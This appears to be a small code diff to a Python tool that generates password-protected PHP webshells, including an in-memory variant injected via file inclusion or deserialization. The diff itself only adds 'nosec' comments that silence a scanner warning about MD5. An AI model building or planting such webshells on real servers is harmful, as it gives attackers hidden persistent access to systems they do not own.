@@ -158,7 +158,7 @@ ${''.join(secrets.choice(string.ascii_lowercase) for _ in range(4))}={'.'.join(v
             obfuscation: 混淆级别
         """
         password = password or self._generate_password()
-        password_md5 = hashlib.md5(password.encode()).hexdigest()
+        password_md5 = hashlib.md5(password.encode()).hexdigest()  # nosec B324  # MD5 used for webshell password auth in generated payload
 
         if shell_type == "basic":
             # 基础一句话
@@ -230,7 +230,7 @@ if(md5($_POST['pwd'])==$p){{
         注: 需要通过文件包含或反序列化注入
         """
         password = password or self._generate_password()
-        password_md5 = hashlib.md5(password.encode()).hexdigest()
+        password_md5 = hashlib.md5(password.encode()).hexdigest()  # nosec B324  # MD5 used for webshell password auth in generated payload
 
         code = f"""<?php
 // 内存马 - 注入到 Session 或全局变量
